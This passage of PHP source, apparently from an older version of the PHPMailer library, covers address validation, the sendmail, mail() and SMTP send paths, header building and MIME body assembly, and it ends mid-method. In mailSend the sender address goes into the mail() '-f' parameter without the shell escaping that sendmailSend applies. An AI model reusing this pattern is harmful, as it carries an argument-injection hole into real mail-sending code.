                //An older regex that doesn't need a recent PCRE
                return (boolean)preg_match(
                    '/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>' .
                    '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' .
                    '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' .
                    '@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})' .
                    '(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:' .
                    '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' .
                    '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' .
                    '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' .
                    '::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',
                    $address
                );
            case 'html5':
                /**
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (boolean)preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'noregex':
                //No PCRE! Do something _very_ approximate!
                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
                return (strlen($address) >= 3
                    and strpos($address, '@') >= 1
                    and strpos($address, '@') != strlen($address) - 1);
            case 'php':
            default:
                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }

    /**
     * Create a message and send it.
     * Uses the sending method specified by $Mailer.
     * @throws phpmailerException
     * @return boolean false on error - See the ErrorInfo property for details of the error.
     */
    public function send()
    {
        try {
            if (!$this->preSend()) {
                return false;
            }
            return $this->postSend();
        } catch (phpmailerException $exc) {
            $this->mailHeader = '';
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    /**
     * Prepare a message for sending.
     * @throws phpmailerException
     * @return boolean
     */
    public function preSend()
    {
        try {
            $this->mailHeader = '';
            if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
                throw new phpmailerException($this->lang('provide_address'), self::STOP_CRITICAL);
            }

            // Set whether the message is multipart/alternative
            if (!empty($this->AltBody)) {
                $this->ContentType = 'multipart/alternative';
            }

            $this->error_count = 0; // reset errors
            $this->setMessageType();
            // Refuse to send an empty message unless we are specifically allowing it
            if (!$this->AllowEmpty and empty($this->Body)) {
                throw new phpmailerException($this->lang('empty_message'), self::STOP_CRITICAL);
            }

            $this->MIMEHeader = $this->createHeader();
            $this->MIMEBody = $this->createBody();

            // To capture the complete message when using mail(), create
            // an extra header list which createHeader() doesn't fold in
            if ($this->Mailer == 'mail') {
                if (count($this->to) > 0) {
                    $this->mailHeader .= $this->addrAppend('To', $this->to);
                } else {
                    $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;');
                }
                $this->mailHeader .= $this->headerLine(
                    'Subject',
                    $this->encodeHeader($this->secureHeader(trim($this->Subject)))
                );
            }

            // Sign with DKIM if enabled
            if (!empty($this->DKIM_domain)
                && !empty($this->DKIM_private)
                && !empty($this->DKIM_selector)
                && file_exists($this->DKIM_private)) {
                $header_dkim = $this->DKIM_Add(
                    $this->MIMEHeader . $this->mailHeader,
                    $this->encodeHeader($this->secureHeader($this->Subject)),
                    $this->MIMEBody
                );
                $this->MIMEHeader = rtrim($this->MIMEHeader, "\r\n ") . self::CRLF .
                    str_replace("\r\n", "\n", $header_dkim) . self::CRLF;
            }
            return true;

        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    /**
     * Actually send a message.
     * Send the email via the selected mechanism
     * @throws phpmailerException
     * @return boolean
     */
    public function postSend()
    {
        try {
            // Choose the mailer and send through it
            switch ($this->Mailer) {
                case 'sendmail':
                case 'qmail':
                    return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
                case 'smtp':
                    return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
                case 'mail':
                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
                default:
                    $sendMethod = $this->Mailer.'Send';
                    if (method_exists($this, $sendMethod)) {
                        return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                    }

                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
            }
        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
        }
        return false;
    }

    /**
     * Send mail using the $Sendmail program.
     * @param string $header The message headers
     * @param string $body The message body
     * @see PHPMailer::$Sendmail
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
    protected function sendmailSend($header, $body)
    {
        if ($this->Sender != '') {
            if ($this->Mailer == 'qmail') {
                $sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
            } else {
                $sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
            }
        } else {
            if ($this->Mailer == 'qmail') {
                $sendmail = sprintf('%s', escapeshellcmd($this->Sendmail));
            } else {
                $sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));
            }
        }
        if ($this->SingleTo) {
            foreach ($this->SingleToArray as $toAddr) {
                if (!@$mail = popen($sendmail, 'w')) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
                fputs($mail, 'To: ' . $toAddr . "\n");
                fputs($mail, $header);
                fputs($mail, $body);
                $result = pclose($mail);
                $this->doCallback(
                    ($result == 0),
                    array($toAddr),
                    $this->cc,
                    $this->bcc,
                    $this->Subject,
                    $body,
                    $this->From
                );
                if ($result != 0) {
                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
                }
            }
        } else {
            if (!@$mail = popen($sendmail, 'w')) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
            fputs($mail, $header);
            fputs($mail, $body);
            $result = pclose($mail);
            $this->doCallback(($result == 0), $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            if ($result != 0) {
                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
            }
        }
        return true;
    }

    /**
     * Send mail using the PHP mail() function.
     * @param string $header The message headers
     * @param string $body The message body
     * @link http://www.php.net/manual/en/book.mail.php
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        if (empty($this->Sender)) {
            $params = ' ';
        } else {
            $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo && count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            }
        } else {
            $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
        }
        if (isset($old_from)) {
            ini_set('sendmail_from', $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
        }
        return true;
    }

    /**
     * Get an instance to use for SMTP operations.
     * Override this function to load your own SMTP implementation
     * @return SMTP
     */
    public function getSMTPInstance()
    {
        if (!is_object($this->smtp)) {
            $this->smtp = new SMTP;
        }
        return $this->smtp;
    }

    /**
     * Send mail via SMTP.
     * Returns false if there is a bad MAIL FROM, RCPT, or DATA input.
     * Uses the PHPMailerSMTP class by default.
     * @see PHPMailer::getSMTPInstance() to use a different class.
     * @param string $header The message headers
     * @param string $body The message body
     * @throws phpmailerException
     * @uses SMTP
     * @access protected
     * @return boolean
     */
    protected function smtpSend($header, $body)
    {
        $bad_rcpt = array();

        if (!$this->smtpConnect()) {
            throw new phpmailerException($this->lang('smtp_connect_failed'), self::STOP_CRITICAL);
        }
        $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;
        if (!$this->smtp->mail($smtp_from)) {
            $this->setError($this->lang('from_failed') . $smtp_from . ' : ' . implode(',', $this->smtp->getError()));
            throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL);
        }

        // Attempt to send to all recipients
        foreach ($this->to as $to) {
            if (!$this->smtp->recipient($to[0])) {
                $bad_rcpt[] = $to[0];
                $isSent = false;
            } else {
                $isSent = true;
            }
            $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From);
        }
        foreach ($this->cc as $cc) {
            if (!$this->smtp->recipient($cc[0])) {
                $bad_rcpt[] = $cc[0];
                $isSent = false;
            } else {
                $isSent = true;
            }
            $this->doCallback($isSent, array(), array($cc[0]), array(), $this->Subject, $body, $this->From);
        }
        foreach ($this->bcc as $bcc) {
            if (!$this->smtp->recipient($bcc[0])) {
                $bad_rcpt[] = $bcc[0];
                $isSent = false;
            } else {
                $isSent = true;
            }
            $this->doCallback($isSent, array(), array(), array($bcc[0]), $this->Subject, $body, $this->From);
        }

        // Only send the DATA command if we have viable recipients
        if ((count($this->all_recipients) > count($bad_rcpt)) and !$this->smtp->data($header . $body)) {
            throw new phpmailerException($this->lang('data_not_accepted'), self::STOP_CRITICAL);
        }
        if ($this->SMTPKeepAlive) {
            $this->smtp->reset();
        } else {
            $this->smtp->quit();
            $this->smtp->close();
        }
        if (count($bad_rcpt) > 0) { // Create error message for any bad addresses
            throw new phpmailerException(
                $this->lang('recipients_failed') . implode(', ', $bad_rcpt),
                self::STOP_CONTINUE
            );
        }
        return true;
    }

    /**
     * Initiate a connection to an SMTP server.
     * Returns false if the operation failed.
     * @param array $options An array of options compatible with stream_context_create()
     * @uses SMTP
     * @access public
     * @throws phpmailerException
     * @return boolean
     */
    public function smtpConnect($options = array())
    {
        if (is_null($this->smtp)) {
            $this->smtp = $this->getSMTPInstance();
        }

        // Already connected?
        if ($this->smtp->connected()) {
            return true;
        }

        $this->smtp->setTimeout($this->Timeout);
        $this->smtp->setDebugLevel($this->SMTPDebug);
        $this->smtp->setDebugOutput($this->Debugoutput);
        $this->smtp->setVerp($this->do_verp);
        $hosts = explode(';', $this->Host);
        $lastexception = null;

        foreach ($hosts as $hostentry) {
            $hostinfo = array();
            if (!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*):?([0-9]*)$/', trim($hostentry), $hostinfo)) {
                // Not a valid host entry
                continue;
            }
            // $hostinfo[2]: optional ssl or tls prefix
            // $hostinfo[3]: the hostname
            // $hostinfo[4]: optional port number
            // The host string prefix can temporarily override the current setting for SMTPSecure
            // If it's not specified, the default value is used
            $prefix = '';
            $tls = ($this->SMTPSecure == 'tls');
            if ($hostinfo[2] == 'ssl' or ($hostinfo[2] == '' and $this->SMTPSecure == 'ssl')) {
                $prefix = 'ssl://';
                $tls = false; // Can't have SSL and TLS at once
            } elseif ($hostinfo[2] == 'tls') {
                $tls = true;
                // tls doesn't use a prefix
            }
            $host = $hostinfo[3];
            $port = $this->Port;
            $tport = (integer)$hostinfo[4];
            if ($tport > 0 and $tport < 65536) {
                $port = $tport;
            }
            if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
                try {
                    if ($this->Helo) {
                        $hello = $this->Helo;
                    } else {
                        $hello = $this->serverHostname();
                    }
                    $this->smtp->hello($hello);

                    if ($tls) {
                        if (!$this->smtp->startTLS()) {
                            throw new phpmailerException($this->lang('connect_host'));
                        }
                        // We must resend HELO after tls negotiation
                        $this->smtp->hello($hello);
                    }
                    if ($this->SMTPAuth) {
                        if (!$this->smtp->authenticate(
                            $this->Username,
                            $this->Password,
                            $this->AuthType,
                            $this->Realm,
                            $this->Workstation
                        )
                        ) {
                            throw new phpmailerException($this->lang('authenticate'));
                        }
                    }
                    return true;
                } catch (phpmailerException $exc) {
                    $lastexception = $exc;
                    // We must have connected, but then failed TLS or Auth, so close connection nicely
                    $this->smtp->quit();
                }
            }
        }
        // If we get here, all connection attempts have failed, so close connection hard
        $this->smtp->close();
        // As we've caught all exceptions, just report whatever the last one was
        if ($this->exceptions and !is_null($lastexception)) {
            throw $lastexception;
        }
        return false;
    }

    /**
     * Close the active SMTP session if one exists.
     * @return void
     */
    public function smtpClose()
    {
        if ($this->smtp !== null) {
            if ($this->smtp->connected()) {
                $this->smtp->quit();
                $this->smtp->close();
            }
        }
    }

    /**
     * Set the language for error messages.
     * Returns false if it cannot load the language file.
     * The default language is English.
     * @param string $langcode ISO 639-1 2-character language code (e.g. French is "fr")
     * @param string $lang_path Path to the language file directory, with trailing separator (slash)
     * @return boolean
     * @access public
     */
    public function setLanguage($langcode = 'en', $lang_path = '')
    {
        // Define full set of translatable strings in English
        $PHPMAILER_LANG = array(
            'authenticate' => 'SMTP Error: Could not authenticate.',
            'connect_host' => 'SMTP Error: Could not connect to SMTP host.',
            'data_not_accepted' => 'SMTP Error: data not accepted.',
            'empty_message' => 'Message body empty',
            'encoding' => 'Unknown encoding: ',
            'execute' => 'Could not execute: ',
            'file_access' => 'Could not access file: ',
            'file_open' => 'File Error: Could not open file: ',
            'from_failed' => 'The following From address failed: ',
            'instantiate' => 'Could not instantiate mail function.',
            'invalid_address' => 'Invalid address',
            'mailer_not_supported' => ' mailer is not supported.',
            'provide_address' => 'You must provide at least one recipient email address.',
            'recipients_failed' => 'SMTP Error: The following recipients failed: ',
            'signing' => 'Signing Error: ',
            'smtp_connect_failed' => 'SMTP connect() failed.',
            'smtp_error' => 'SMTP server error: ',
            'variable_set' => 'Cannot set or reset variable: '
        );
        if (empty($lang_path)) {
            // Calculate an absolute path so it can work if CWD is not here
            $lang_path = dirname(__FILE__). DIRECTORY_SEPARATOR . 'language'. DIRECTORY_SEPARATOR;
        }
        $foundlang = true;
        $lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
        if ($langcode != 'en') { // There is no English translation file
            // Make sure language file path is readable
            if (!is_readable($lang_file)) {
                $foundlang = false;
            } else {
                // Overwrite language-specific strings.
                // This way we'll never have missing translations.
                $foundlang = include $lang_file;
            }
        }
        $this->language = $PHPMAILER_LANG;
        return (boolean)$foundlang; // Returns false if language not found
    }

    /**
     * Get the array of strings for the current language.
     * @return array
     */
    public function getTranslations()
    {
        return $this->language;
    }

    /**
     * Create recipient headers.
     * @access public
     * @param string $type
     * @param array $addr An array of recipient,
     * where each recipient is a 2-element indexed array with element 0 containing an address
     * and element 1 containing a name, like:
     * array(array('joe@example.com', 'Joe User'), array('zoe@example.com', 'Zoe User'))
     * @return string
     */
    public function addrAppend($type, $addr)
    {
        $addresses = array();
        foreach ($addr as $address) {
            $addresses[] = $this->addrFormat($address);
        }
        return $type . ': ' . implode(', ', $addresses) . $this->LE;
    }

    /**
     * Format an address for use in a message header.
     * @access public
     * @param array $addr A 2-element indexed array, element 0 containing an address, element 1 containing a name
     *      like array('joe@example.com', 'Joe User')
     * @return string
     */
    public function addrFormat($addr)
    {
        if (empty($addr[1])) { // No name provided
            return $this->secureHeader($addr[0]);
        } else {
            return $this->encodeHeader($this->secureHeader($addr[1]), 'phrase') . ' <' . $this->secureHeader(
                $addr[0]
            ) . '>';
        }
    }

    /**
     * Word-wrap message.
     * For use with mailers that do not automatically perform wrapping
     * and for quoted-printable encoded messages.
     * Original written by philippe.
     * @param string $message The message to wrap
     * @param integer $length The line length to wrap to
     * @param boolean $qp_mode Whether to run in Quoted-Printable mode
     * @access public
     * @return string
     */
    public function wrapText($message, $length, $qp_mode = false)
    {
        $soft_break = ($qp_mode) ? sprintf(' =%s', $this->LE) : $this->LE;
        // If utf-8 encoding is used, we will need to make sure we don't
        // split multibyte characters when we wrap
        $is_utf8 = (strtolower($this->CharSet) == 'utf-8');
        $lelen = strlen($this->LE);
        $crlflen = strlen(self::CRLF);

        $message = $this->fixEOL($message);
        if (substr($message, -$lelen) == $this->LE) {
            $message = substr($message, 0, -$lelen);
        }

        $line = explode($this->LE, $message); // Magic. We know fixEOL uses $LE
        $message = '';
        for ($i = 0; $i < count($line); $i++) {
            $line_part = explode(' ', $line[$i]);
            $buf = '';
            for ($e = 0; $e < count($line_part); $e++) {
                $word = $line_part[$e];
                if ($qp_mode and (strlen($word) > $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if ($e != 0) {
                        if ($space_left > 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this->utf8CharBoundary($word, $len);
                            } elseif (substr($word, $len - 1, 1) == '=') {
                                $len--;
                            } elseif (substr($word, $len - 2, 1) == '=') {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= ' ' . $part;
                            $message .= $buf . sprintf('=%s', self::CRLF);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = '';
                    }
                    while (strlen($word) > 0) {
                        if ($length <= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this->utf8CharBoundary($word, $len);
                        } elseif (substr($word, $len - 1, 1) == '=') {
                            $len--;
                        } elseif (substr($word, $len - 2, 1) == '=') {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);

                        if (strlen($word) > 0) {
                            $message .= $part . sprintf('=%s', self::CRLF);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    $buf .= ($e == 0) ? $word : (' ' . $word);

                    if (strlen($buf) > $length and $buf_o != '') {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
            }
            $message .= $buf . self::CRLF;
        }

        return $message;
    }

    /**
     * Find the last character boundary prior to $maxLength in a utf-8
     * quoted (printable) encoded string.
     * Original written by Colin Brown.
     * @access public
     * @param string $encodedText utf-8 QP text
     * @param integer $maxLength   find last character boundary prior to this length
     * @return integer
     */
    public function utf8CharBoundary($encodedText, $maxLength)
    {
        $foundSplitPos = false;
        $lookBack = 3;
        while (!$foundSplitPos) {
            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) { // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    $maxLength = ($encodedCharPos == 0) ? $maxLength :
                        $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec >= 192) { // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength = $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec < 192) { // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $foundSplitPos = true;
            }
        }
        return $maxLength;
    }

    /**
     * Set the body wrapping.
     * @access public
     * @return void
     */
    public function setWordWrap()
    {
        if ($this->WordWrap < 1) {
            return;
        }

        switch ($this->message_type) {
            case 'alt':
            case 'alt_inline':
            case 'alt_attach':
            case 'alt_inline_attach':
                $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap);
                break;
            default:
                $this->Body = $this->wrapText($this->Body, $this->WordWrap);
                break;
        }
    }

    /**
     * Assemble message headers.
     * @access public
     * @return string The assembled headers
     */
    public function createHeader()
    {
        $result = '';

        // Set the boundaries
        $uniq_id = md5(uniqid(time()));
        $this->boundary[1] = 'b1_' . $uniq_id;
        $this->boundary[2] = 'b2_' . $uniq_id;
        $this->boundary[3] = 'b3_' . $uniq_id;

        if ($this->MessageDate == '') {
            $this->MessageDate = self::rfcDate();
        }
        $result .= $this->headerLine('Date', $this->MessageDate);


        // To be created automatically by mail()
        if ($this->SingleTo) {
            if ($this->Mailer != 'mail') {
                foreach ($this->to as $toaddr) {
                    $this->SingleToArray[] = $this->addrFormat($toaddr);
                }
            }
        } else {
            if (count($this->to) > 0) {
                if ($this->Mailer != 'mail') {
                    $result .= $this->addrAppend('To', $this->to);
                }
            } elseif (count($this->cc) == 0) {
                $result .= $this->headerLine('To', 'undisclosed-recipients:;');
            }
        }

        $result .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName)));

        // sendmail and mail() extract Cc from the header before sending
        if (count($this->cc) > 0) {
            $result .= $this->addrAppend('Cc', $this->cc);
        }

        // sendmail and mail() extract Bcc from the header before sending
        if ((
                $this->Mailer == 'sendmail' or $this->Mailer == 'qmail' or $this->Mailer == 'mail'
            )
            and count($this->bcc) > 0
        ) {
            $result .= $this->addrAppend('Bcc', $this->bcc);
        }

        if (count($this->ReplyTo) > 0) {
            $result .= $this->addrAppend('Reply-To', $this->ReplyTo);
        }

        // mail() sets the subject itself
        if ($this->Mailer != 'mail') {
            $result .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject)));
        }

        if ($this->MessageID != '') {
            $this->lastMessageID = $this->MessageID;
        } else {
            $this->lastMessageID = sprintf('<%s@%s>', $uniq_id, $this->ServerHostname());
        }
        $result .= $this->HeaderLine('Message-ID', $this->lastMessageID);
        $result .= $this->headerLine('X-Priority', $this->Priority);
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'PHPMailer ' . $this->Version . ' (https://github.com/PHPMailer/PHPMailer/)'
            );
        } else {
            $myXmailer = trim($this->XMailer);
            if ($myXmailer) {
                $result .= $this->headerLine('X-Mailer', $myXmailer);
            }
        }

        if ($this->ConfirmReadingTo != '') {
            $result .= $this->headerLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
        }

        // Add custom headers
        for ($index = 0; $index < count($this->CustomHeader); $index++) {
            $result .= $this->headerLine(
                trim($this->CustomHeader[$index][0]),
                $this->encodeHeader(trim($this->CustomHeader[$index][1]))
            );
        }
        if (!$this->sign_key_file) {
            $result .= $this->headerLine('MIME-Version', '1.0');
            $result .= $this->getMailMIME();
        }

        return $result;
    }

    /**
     * Get the message MIME type headers.
     * @access public
     * @return string
     */
    public function getMailMIME()
    {
        $result = '';
        $ismultipart = true;
        switch ($this->message_type) {
            case 'inline':
                $result .= $this->headerLine('Content-Type', 'multipart/related;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'attach':
            case 'inline_attach':
            case 'alt_attach':
            case 'alt_inline_attach':
                $result .= $this->headerLine('Content-Type', 'multipart/mixed;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'alt':
            case 'alt_inline':
                $result .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            default:
                // Catches case 'plain': and case '':
                $result .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet);
                $ismultipart = false;
                break;
        }
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($this->Encoding != '7bit') {
            // RFC 2045 section 6.4 says multipart MIME parts may only use 7bit, 8bit or binary CTE
            if ($ismultipart) {
                if ($this->Encoding == '8bit') {
                    $result .= $this->headerLine('Content-Transfer-Encoding', '8bit');
                }
                // The only remaining alternatives are quoted-printable and base64, which are both 7bit compatible
            } else {
                $result .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding);
            }
        }

        if ($this->Mailer != 'mail') {
            $result .= $this->LE;
        }

        return $result;
    }

    /**
     * Returns the whole MIME message.
     * Includes complete headers and body.
     * Only valid post preSend().
     * @see PHPMailer::preSend()
     * @access public
     * @return string
     */
    public function getSentMIMEMessage()
    {
        return $this->MIMEHeader . $this->mailHeader . self::CRLF . $this->MIMEBody;
    }


    /**
     * Assemble the message body.
     * Returns an empty string on failure.
     * @access public
     * @throws phpmailerException
     * @return string The assembled message body
     */
    public function createBody()
    {
        $body = '';

        if ($this->sign_key_file) {
            $body .= $this->getMailMIME() . $this->LE;
        }

        $this->setWordWrap();

        $bodyEncoding = $this->Encoding;
        $bodyCharSet = $this->CharSet;
        if ($bodyEncoding == '8bit' and !$this->has8bitChars($this->Body)) {
            $bodyEncoding = '7bit';
            $bodyCharSet = 'us-ascii';
        }
        $altBodyEncoding = $this->Encoding;
        $altBodyCharSet = $this->CharSet;
        if ($altBodyEncoding == '8bit' and !$this->has8bitChars($this->AltBody)) {
            $altBodyEncoding = '7bit';
            $altBodyCharSet = 'us-ascii';
        }
        switch ($this->message_type) {
            case 'inline':
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[1]);
                break;
            case 'attach':
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'inline_attach':
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt':
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                if (!empty($this->Ical)) {
                    $body .= $this->getBoundary($this->boundary[1], '', 'text/calendar; method=REQUEST', '');
                    $body .= $this->encodeString($this->Ical, $this->Encoding);
                    $body .= $this->LE . $this->LE;
                }
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_inline':
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_attach':
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;

            case 'alt_inline_attach':
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[2]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[3] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, 'text/html', $bodyEncoding);
